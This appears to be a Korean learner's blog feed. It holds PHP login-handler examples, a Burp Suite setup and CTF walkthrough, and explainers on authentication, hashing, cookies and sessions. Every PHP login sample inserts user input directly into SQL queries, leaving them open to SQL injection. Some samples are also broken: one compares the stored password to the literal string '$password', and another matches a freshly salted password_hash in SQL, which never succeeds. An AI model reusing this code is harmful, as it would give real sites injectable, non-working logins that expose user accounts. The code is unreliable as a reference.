    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT id FROM data WHERE id = '</span><span class="nv">$id</span><span class="s2">' AND psw = '</span><span class="nv">$password</span><span class="s2">'"</span><span class="p">;</span> 
    <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span> 		<span class="c1"># 쿼리실행, 다른방법은$conn-&gt;query($sql); </span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 			<span class="c1"># 일치하는 사용자가 하나 이상 있는 경우</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">();</span> 		<span class="c1"># db로 id 정보 가져옴.fetch_assoc은 배열이 아닌 정보만 가져옴.</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 		<span class="c1"># id정보 세션에 저장</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: login_success.php"</span><span class="p">);</span> 
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild login name or password'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span> 
</code></pre></div></div>

<p><br /></p>

<h2 id="12-식별과-인증-분리해서-진행"><span style="background:#696969; color:#ffffff">1.2 식별과 인증 분리해서 진행</span></h2>

<p><br /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span> 					<span class="c1"># 세션을 시작</span>
<span class="k">include</span> <span class="s1">'db.php'</span><span class="p">;</span> 					<span class="c1"># 데이터베이스 연결 파일을 포함</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span> 		<span class="c1"># post방식인 것만 진행(확인하는 용도)</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 				<span class="c1"># 로그인 폼에 사용자가 입력한 id</span>

    
    <span class="c1">#db로부터 사용자가 작성한 id와 같은 데이터를 찾음(식별만 진행) </span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT id,psw FROM data WHERE id = '</span><span class="nv">$id</span><span class="s2">'"</span><span class="p">;</span> 		
    <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span> 		<span class="c1">#쿼리실행</span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 			<span class="c1"># 일치하는 사용자가 하나 이상 있는 경우</span>
        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span> 		<span class="c1"># 로그인 폼에 사용자가 입력한 password</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">();</span> 		<span class="c1"># db로부터 id,password 정보 가져옴. </span>
       
        <span class="c1"># db로부터 가져온 password가 사용자가 작성한 password와 같은지 확인. 맞으면 성공페이지,틀리면 실패페이지로 이동</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="p">[</span><span class="s1">'psw'</span><span class="p">]</span><span class="o">==</span><span class="s1">'$password'</span><span class="p">){</span>				
          <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'User_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 		<span class="c1"># id정보 세션에 저장,로그인 유지를 위함.</span>
          <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: login_success.php"</span><span class="p">);</span> 
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild+login+name+or+password'</span><span class="p">);</span> 
        <span class="p">}</span> 
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild+login+name+or+password'</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><br /></p>

<h2 id="13-hash를-이용한-식별과-인증-동시에-진행"><span style="background:#696969; color:#ffffff">1.3 hash를 이용한 식별과 인증 동시에 진행</span></h2>
<p><br /></p>

<p>위와 마찬가지로 거의 같지만 해싱처리된 비밀번호를 확인하는 과정을 거친다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span> 					<span class="c1"># 세션을 시작</span>
<span class="k">include</span> <span class="s1">'db.php'</span><span class="p">;</span> 					<span class="c1"># 데이터베이스 연결 파일을 포함</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span> 		<span class="c1"># post방식인 것만 진행(확인하는 용도)</span>
    <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 				<span class="c1"># 로그인 폼에 사용자가 입력한 id</span>
    <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span> 			<span class="c1"># 로그인 폼에 사용자가 입력한 password</span>
    <span class="nv">$hased_password</span> <span class="o">=</span> <span class="nb">password_hash</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span> <span class="no">PASSWORD_DEFAULT</span><span class="p">);</span> <span class="c1">#해싱처리된 입력한 비밀번호</span>
    
    <span class="c1">#db로부터 사용자가 작성한 id password 둘다 맞는 데이터를 찾음(식별과 인증이 동시에 들어감) </span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT id FROM data WHERE id = '</span><span class="nv">$id</span><span class="s2">' AND psw = '</span><span class="nv">$hased_password</span><span class="s2">'"</span><span class="p">;</span> 
    <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span> 		<span class="c1"># 쿼리실행, 다른방법은$conn-&gt;query($sql); </span>

    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 			<span class="c1"># 일치하는 사용자가 하나 이상 있는 경우</span>
        <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">();</span> 		<span class="c1"># db로 id 정보 가져옴.fetch_assoc은 배열이 아닌 정보만 가져옴.</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 		<span class="c1"># id정보 세션에 저장</span>
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: login_success.php"</span><span class="p">);</span> 
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild login name or password'</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span> 
</code></pre></div></div>

<p><br /></p>

<h2 id="14-hash를-이용한-식별과-인증-분리해서-진행"><span style="background:#696969; color:#ffffff">1.4 hash를 이용한 식별과 인증 분리해서 진행</span></h2>
<p><br /></p>

<p>중요한 점은 인증하는 과정에서 해싱처리된 비밀번호와 사용자가 작성한 비밀번호를 어떻게 확인하는가 입니다.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span> 
<span class="k">include</span> <span class="s1">'db.php'</span><span class="p">;</span> 

<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REQUEST_METHOD"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"POST"</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 

  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT id,psw FROM data WHERE id = '</span><span class="nv">$id</span><span class="s2">'"</span><span class="p">;</span>  
  <span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span> 

  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> 
      <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span> 
      <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="nf">fetch_assoc</span><span class="p">();</span> 
      
      <span class="c1">#해싱처리된 비밀번호가 db에 저장되어있는 것을 가져왔다. 사용자가 작성한 비밀번호가 맞는지 확인이 필요하다!!</span>
      <span class="c1">#password_verify: 해싱된 비밀번호와 작성한 비밀번호 확인할때 사용.</span>
      <span class="k">if</span><span class="p">(</span><span class="nb">password_verify</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span><span class="nv">$user</span><span class="p">[</span><span class="s1">'psw'</span><span class="p">]))</span> <span class="p">{</span>         
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'User_id'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span> 
        <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: login_success.php"</span><span class="p">);</span> 
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild+login+name+or+password'</span><span class="p">);</span> 
      <span class="p">}</span> 
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /index.php?incorrect=invaild+login+name+or+password'</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>]]></content><author><name>ethan</name></author><category term="project" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Burp suite 설치 및 사용법, 간단한 ctf 풀기</title><link href="http://localhost:4000/web/WEB3/" rel="alternate" type="text/html" title="Burp suite 설치 및 사용법, 간단한 ctf 풀기" /><published>2024-05-09T00:00:00+09:00</published><updated>2024-05-09T00:00:00+09:00</updated><id>http://localhost:4000/web/WEB3</id><content type="html" xml:base="http://localhost:4000/web/WEB3/"><![CDATA[<p><br /></p>

<h1 id="1-burp-suite-설치-및-기본-세팅"><span style="background:#000000; color:#ffffff">1. Burp suite 설치 및 기본 세팅</span></h1>

<p><br /><img src="/images/2024-05-09-2/캡처_2024_05_09_22_32_55_991.png" alt="캡처_2024_05_09_22_32_55_991" style="zoom: 33%;" /></p>

<p>burp suite 홈페이지 들어가서 ▶ Products ▶ community Edition 들어가서 다운로드 받으시면 됩니다. <br />
실행 이후에도 next를 계속 눌러 들어갑니다.</p>

<p><br /></p>

<h2 id="11-web-proxy-tool-개념"><span style="background:#696969; color:#ffffff">1.1 web proxy tool 개념</span></h2>

<p><br />burp suite 은 대표적인 web proxy tool 입니다. <br />
web proxy tool의 역할은 다음 그림과 같습니다.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/1*OrFHdkiN2RkFo9qfG39Q3w.png" alt="The Proxy API Is So Powerful That Every Web Developer Should Master It! |  by Bytefer | JavaScript in Plain English" style="zoom: 50%;" /></p>

<p>서버와 브라우저의 서로 오고 가는 요청들을 대신 전달하는 일을 합니다.<br />
그러면 어떤 장점이 있을까요?<br />
실시간으로 주고 받는 패킷<sup>(1)</sup>을 볼 수 있고 조작하여 서버를 보내서 처리되는 방식을 테스트 할 수 있습니다.<br />
이는 보안의 취약점을 식별하는데 중요한 역할을 합니다.</p>

<p><br /></p>

<p><span style="font-weight:bold">-단어 정리-</span></p>

<p>패킷<sup>(1)</sup> : 효율적인 전송과 관리를 위해 데이터를 나눈 작은 데이터입니다. 네트워크에서 데이터 교환의 기본 단위.</p>

<p>패킷은 헤더와 페이로드로 이루어져 있습니다. 헤더는 정확하게 정보가 처리되도록, 올바른 경로로 가도록 도움을 줍니다. <br />
페이로드는 전송하고자 하는 데이터입니다.</p>

<p>만약 택배로 물건을 보낸다고 생각한다면, 헤더는 올바르고 정확히 배달하는 기사님이고 / 페이로드는 배송하는 물건이 되겠네요.</p>

<p><br /></p>

<h2 id="12-기본적인-세팅"><span style="background:#696969; color:#ffffff">1.2 기본적인 세팅</span></h2>

<p><br /></p>

<p>burp suite를 설치했다면 가장 중요하게 생각해야 하는 것이 기본 세팅입니다.</p>

<ol>
  <li><span style="font-weight:bold">브라우저와 서버의 중간다리 역할을 하므로 proxy에 listener를 켜두어야하고, 사용하는 웹브라우저에서 수동 프록시 설정을 활성화 해야합니다. </span></li>
</ol>

<p><br /><img src="/images/2024-05-09-2/2.PNG" alt="2" style="zoom: 50%;" /><img src="/images/2024-05-09-2/4.PNG" alt="4" style="zoom:50%;" /></p>

<p><br />경로:&lt;burp → settings →proxy listeners&gt;</p>

<p>경로 : &lt;웹브라우저 실행 → 설정 → 프록시 검색 → 프록시 설정&gt;</p>

<p>주소는 127.0.0.1 이나 localhost이고,  포트 번호은 입력해야 합니다. (브라우저랑 listener가 같아야함.)</p>

<p><br /></p>

<ol>
  <li>
    <p><span style="font-weight:bold">다음은 한글 깨짐 현상을 발생하는 것을 방지하기 위한 설정입니다.</span><br />
한글 지원되는 글꼴과 utf-8을 사용해야합니다.</p>

    <p>경로 : &lt;setting→user→user interface→inspector and message editor&gt;</p>
  </li>
</ol>

<p><img src="/images/2024-05-09-2/image-20240510034634007.png" alt="image-20240510034634007" style="zoom:50%;" /></p>

<p><br /></p>

<h1 id="2-burp-suite-일반적으로-자주-쓰는-키"><span style="background:#000000; color:#ffffff">2. Burp suite 일반적으로 자주 쓰는 키</span></h1>

<p><br /></p>

<p>① intercept on : 프록시에서 사용자의 요청을 잡아서 멈추게 합니다.  forward를 누르면 서버에 전송됩니다. 요청을 잡을 때 데이터를</p>

<p>변경, 조작할 수 있습니다.</p>

<p>② history : 주고 받는 웹 요청이 쌓인다. 브라우저에서 동작해보고 하나 하나 분석하기 좋다.</p>

<p>③ Repeater : 보통 intercept on 으로 잡아서 forward로 전송하는데 이렇게 하나하나 조작하면서 보내는 게 번거롭다.<br />
그래서 Repeater는 반복해서 보낼 수 있어서 조작해서 보내기 수월하다.</p>

<p>④ decoder : 인코딩과 디코딩을 한다.</p>

<p>⑤comparar : 두 개의 엄청 긴 페이로드를 비교해야할 때 유용하다. repeater와 같이 자주 활용한다.</p>

<p><br /></p>

<p>사용법은 ctf를 풀면서 보는게 좋을 것 같다.</p>

<p><br /></p>

<h1 id="3-간단한-ctf-풀기"><span style="background:#000000; color:#ffffff">3. 간단한 ctf 풀기</span></h1>

<p><br /></p>

<h2 id="1번-문제"><span style="background:#696969; color:#ffffff"><span style="font-weight:bold; font-size:25px">1번 문제.</span></span></h2>

<p><img src="/images/2024-05-09-2/1.PNG" alt="1" style="zoom:50%;" /> <br />
문제풀이 url입니다. 기본적인 세팅을 했다는 가정 하에 intercept on을 클릭하고, 브라우저 새로고침하면 패킷이 보이게 됩니다!</p>

<p><br /></p>

<p><img src="/images/2024-05-09-2/6.PNG" alt="6" /><br />
서버에 보내서 어떤 페이로드가 보여지는지 봅시다.</p>

<p><img src="/images/2024-05-09-2/7-1715284218987-8.PNG" alt="7" /></p>

<p>해당 화면은 history 입니다. 주고 받은 웹 요청을 볼 수 있습니다. 서버에 지시 사항이 나타났네요. 데이터를 조작해야겠습니다.</p>

<p><img src="/images/2024-05-09-2/8.PNG" alt="8" style="zoom:80%;" /></p>

<p>조작은 intercept 나 repeater 에서 가능합니다.</p>

<p><img src="/images/2024-05-09-2/9.PNG" alt="9" style="zoom: 67%;" /></p>

<p>조작하고 서버에 다시 전송하니 flag가 나왔습니다. 지웠으니 스스로 해보시길 바랍니다.</p>

<p><br /></p>

<h2 id="2번-문제"><span style="background:#696969; color:#ffffff"><span style="font-weight:bold; font-size:25px">2번 문제.</span></span></h2>

<p>1번 문제와 마찬가지로 진행해줍니다.</p>

<p><img src="/images/2024-05-09-2/10.PNG" alt="10" style="zoom: 67%;" /></p>

<p>그러면 서버의 페이로드를 확인해보니 a.html 과 b.html을 확인해야겠네요. 아마도 comparar를 통해 비교해서 다른 점을 찾는 것 같습니다.</p>

<p><img src="/images/2024-05-09-2/11.PNG" alt="11" /></p>

<p>조작하여 a.html 과 b.html로 변경하면 다음과 같이 데이터가 나옵니다.  a.html, b.html 두 패킷을 우클릭하고 comparar로 보내줍니다.</p>

<p><img src="/images/2024-05-09-2/12.PNG" alt="12" /></p>

<p>다음과 같이 나오고 words를 눌러 비교해줍니다.</p>

<p><img src="/images/2024-05-09-2/13.PNG" alt="13" /></p>

<p>stys view를 클릭해서 보면 동시에 움직이므로 적극적으로 사용해 줍시다! flag가 나왔네요 2번문제도 클리어입니다.</p>

<p><br /></p>

<h2 id="3번-문제"><span style="background:#696969; color:#ffffff"><span style="font-weight:bold; font-size:25px">3번 문제.</span></span></h2>

<p><img src="/images/2024-05-09-2/캡처_2024_05_09_22_16_04_55.png" alt="캡처_2024_05_09_22_16_04_55" /></p>

<p>3번 문제는 answer=1; 이 주어졌으므로, 조작해서 알아내는 방식인 것 같습니다. repeater로 보냅시다.</p>

<p><img src="/images/2024-05-09-2/캡처_2024_05_09_22_16_31_13.png" alt="캡처_2024_05_09_22_16_31_13" /></p>

<p>결국 계속 숫자를 올려서 조작하고 전송했더니 flag가 나왔습니다.</p>

<p><br /></p>

<h2 id="4번-문제"><span style="background:#696969; color:#ffffff"><span style="font-weight:bold; font-size:25px">4번 문제.</span></span></h2>

<p><img src="/images/2024-05-09-2/캡처_2024_05_09_22_20_53_783.png" alt="캡처_2024_05_09_22_20_53_783" /></p>

<p>드래그 해보니 디코딩한 것을 바로 보여줍니다. 현 상태가 user 라는 것을 알았습니다. 서버에서 마치 admin으로 접속하라고 유혹하고 있네요.</p>

<p><img src="/images/2024-05-09-2/캡처_2024_05_09_22_21_23_443-1715285882919-22.png" alt="캡처_2024_05_09_22_21_23_443" /></p>

<p>admin의 인코딩한 값이 필요하니 base64로 인코딩 해줍니다.</p>

<p><img src="/images/2024-05-09-2/캡처_2024_05_09_22_21_32_659-1715286006102-28.png" alt="캡처_2024_05_09_22_21_32_659" /></p>

<p>이런 값이 나왔네요. 바로 조작해서 변경합시다.</p>

<p><img src="/images/2024-05-09-2/캡처_2024_05_09_22_22_17_594.png" alt="" /></p>

<p>flag를 얻으려면 또 디코딩을 해야하네요. 드래그를 해서 오른쪽에 flag를 결국 찾았습니다.</p>]]></content><author><name>ethan</name></author><category term="WEB" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">로그인의 식별과 인증 및 유지</title><link href="http://localhost:4000/web/WEB2/" rel="alternate" type="text/html" title="로그인의 식별과 인증 및 유지" /><published>2024-05-03T00:00:00+09:00</published><updated>2024-05-03T00:00:00+09:00</updated><id>http://localhost:4000/web/WEB2</id><content type="html" xml:base="http://localhost:4000/web/WEB2/"><![CDATA[<p><br /></p>

<h1 id="-1-로그인의-식별과-인증-"><span style="background:#000000; color:#ffffff"> 1. 로그인의 식별과 인증 </span></h1>

<p><br /></p>

<p>로그인이란? 조건에 맞는 사람을 확인하는 작업입니다. <br />
그러면 조건에 맞는 사람을 어떻게 확인할까요?</p>

<p>바로 식별과 인증의  과정을 거칩니다.<br />
식별 : 수많은 데이터 속에서 특정 데이터를 찾아내는 것. ▶ 식별 정보를 찾아냄. (예 ID : primary key)<br />
식별 정보 특징 &gt; 오로지 하나의 id만 존재한다 , 노출되어도 위험이 없다.</p>

<p>인증 : 그  사람이 본인이 맞는지 확인하는 것. ▶ 인증 정보를 확인함.(예 비밀번호)<br />
인증 정보 특징 &gt;  같은 비밀 번호가 존재할 수 있다, 노출되면 위험하다.</p>

<p>다음은 식별과 인증을 진행하는 4가지 방식을 알아보겠습니다.</p>

<p><br /></p>

<h2 id="11-식별과-인증을-하는-일반적인-방법4가지-과-hash-개념"><span style="background:#696969; color:#ffffff">1.1 식별과 인증을 하는 일반적인 방법(4가지) 과 hash 개념</span></h2>

<p><br /></p>

<h3 id="111-식별과-인증을-하는-4가지-방법">1.1.1 식별과 인증을 하는 4가지 방법</h3>

<p><br /></p>

<ol>
  <li>
    <p>식별과 인증 동시에 진행하기</p>
  </li>
  <li>
    <p>식별과 인증 분리해서 진행하기</p>
  </li>
  <li>
    <p>hash 처리로 식별과 인증 동시에 진행하기</p>
  </li>
  <li>
    <p>hash 처리로 식별과 인증 분리해서 진행하기</p>

    <p>이렇게 4가지 방법이 존재합니다.</p>

    <p>hash의 개념은 이다음에 설명하는 것으로 하고, 먼저 식별과 인증을 어떻게 동시에 하는지, 분리해서 진행하는지 간략하게 알아보겠습니다.</p>

    <p>●식별과 인증 동시</p>
  </li>
</ol>

<p>​       ●식별과 인증 분리</p>

<p><br /></p>

<h3 id="113-hash개념">1.1.3 hash개념</h3>

<p><br />
hash개념 알아보기</p>

<p>hash :  클라이언트가 인증을 요청한 비밀번호가 다양한 알고리즘에 의해 긴 문자열로 변환되어 보여주어 보안에 유리하다고 설명할 수 있겠습니다.<br />
▶ 특징 : 한 방향으로 변환되기 때문에 복구가 되지 않습니다. 그래서 보안에 유리하죠.</p>

<p>암호화(Encryption) :  어떤 데이터를 암호화된 데이터로 변환합니다.<br />
▶ 특징 : 양방향으로 데이터를 변환할 수 있습니다, key 만 있다면 복구할 수 있습니다.</p>

<p>인코딩(Encoding) : 어떤 데이터를 데이터 전달에 용이하도록 변화합니다.<br />
▶ 특징 : 양방향으로 데이터를 변환할 수 있습니다, key 가 없어도 복구할 수 있습니다.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:803/1*JB84pvWGjSMG8LVzQLYgJQ.png" alt="img" /></p>

<p><br /></p>

<h1 id="2-로그인-유지"><span style="background:#000000; color:#ffffff">2. 로그인 유지</span></h1>

<p><br /></p>

<h2 id="21-쿠키"><span style="background:#696969; color:#ffffff">2.1 쿠키</span></h2>

<p><br /></p>

<p>초기에는 로그인을 유지할 기능이 없어서 매번 로그인을 해야만 했습니다.<br />
그러다가 쿠키라는 것을 사용하기 시작했습니다.<br />
쿠키는 클라이언트가 서버에 파일을 요청할 때 로그인 정보도 함께 보내서 url이 달라져도 로그인이 될 수 있게 도움을 주었습니다.</p>

<p>하지만 클라이언트가 서버에 파일을 요청하는 방식 때문에 이를 악용한 사람들이 다른 사람의 로그인 정보를 확인하고, 이를 사용하여 보안이 취약해지는 일이 발생했고, 세션이라는 것이 등장했습니다.</p>

<h2 id="22-세션"><br /><span style="background:#696969; color:#ffffff">2.2 세션</span></h2>

<p><br /></p>

<p>세션은 클라이언트가 로그인 정보를 주는 것이 아니라 서버 측에서 로그인 정보를 저장하는 방식입니다.<br />
서버에서 정보들을 식별할 수 있는 식별값이 존재하고, 이것을 세션ID라고 합니다.</p>

<p>동작 과정은 이렇습니다.</p>

<p>로그인▶  세션ID 와 로그인 정보가 서버 측에 저장 ▶ 클라이언트 요청(쿠키(세션ID))  ▶  세션ID로 식별하여 로그인 인증함.  ▶로그아웃</p>

<p>세션ID는 로그인할 때 랜덤 문자열로 주어지고, 로그아웃을 하면 로그인 정보와 함께 사라집니다.</p>

<p><img src="https://youhavetosleep.dev/static/165cc0dae6c870f113dcf191ea853211/9f3a0/session-1.jpg" alt="Session | Blog" style="zoom: 33%;" /></p>]]></content><author><name>ethan</name></author><category term="WEB" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">1주차 로그인페이지 만들기(2)</title><link href="http://localhost:4000/project/Project3/" rel="alternate" type="text/html" title="1주차 로그인페이지 만들기(2)" /><published>2024-04-29T00:00:00+09:00</published><updated>2024-04-29T00:00:00+09:00</updated><id>http://localhost:4000/project/Project3</id><content type="html" xml:base="http://localhost:4000/project/Project3/"><![CDATA[<p><br /></p>

<h1 id="1-로그인-페이지"><span style="background:#000000; color:#ffffff">1. 로그인 페이지</span></h1>

<p><br /></p>

<p>다음 조건으로 로그인 페이지를 만들어보도록 하겠습니다.</p>

<ol>
  <li>
    <p>html, css, php 만으로 작성하기</p>
  </li>
  <li>
    <p>아이디: admin, 비밀번호 : admin1234 로 로그인 할수 있게 하기</p>
  </li>
  <li>
    <p>잘못된 정보로 로그인 했을 시, 경고문 띄우기</p>
  </li>
  <li>
    <p>로그인 된 화면에서 로그아웃하면 본래 로그인화면으로 돌아가기</p>

    <p>밑에 동영상과 같은 시나리오입니다.</p>
  </li>
</ol>

<p><img src="/images/2024-04-29-3/video3-ezgif.com-video-to-gif-converter.gif" alt="video3-ezgif.com-video-to-gif-converter" /></p>

<p><br /></p>

<h2 id="11-php-문구작성"><span style="background:#696969; color:#ffffff">1.1 php 문구작성</span></h2>

<p><br /></p>

<p>1.초기화면(index.php)<br />
2.로그인성공시화면(login_success.php)  	
3.로그인성공유무로 url이동(login.php)
4.로그아웃 클릭시 세션끝내고 초기화면(logout.php)</p>

<p>파일이 4개가 필요한데 이미 이전에 초기화면을 만들어서 3개만 작성하면 된다.</p>

<p><br /></p>

<h3 id="111-로그인성공시-화면">1.1.1 로그인성공시 화면</h3>

<p><br /></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>             <span class="c1">##가독성이 좋게 설명구간 별로 --- 표시</span>
<span class="nb">session_start</span><span class="p">();</span>  <span class="c1">##session은 데이터를 서버쪽에 저장하는 방식이고, 보안성이 뛰어납니다.</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">])){</span>     <span class="c1">##서버에 저장된 아이디가 맞으면 화면이 나오도록하는 if문구</span>
<span class="cp">?&gt;</span>
------------------------
    <span class="cp">&lt;!DOCTYPE html&gt;</span>
    <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;head&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"X-UA-Compatible"</span> <span class="na">content=</span><span class="s">"IE=edge"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;title&gt;</span>Document<span class="nt">&lt;/title&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"style.css"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">'https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css'</span> <span class="na">rel=</span><span class="s">'stylesheet'</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
--------------------------
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"back"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;video</span> <span class="na">autoplay</span> <span class="na">loop</span> <span class="na">muted</span> <span class="na">plays-inline</span><span class="nt">&gt;</span>
                <span class="nt">&lt;source</span> <span class="na">src=</span><span class="s">"video1.mp4"</span> <span class="na">type=</span><span class="s">"video/mp4"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;/video&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"wrapper"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h1&gt;</span>
                    WELCOME, <span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">];</span> <span class="cp">?&gt;</span>  ##서버에 저장된 아이디 출력
                <span class="nt">&lt;/h1&gt;</span>
                <span class="nt">&lt;div&gt;</span>  ## 로그아웃하면 logout.php로 이동
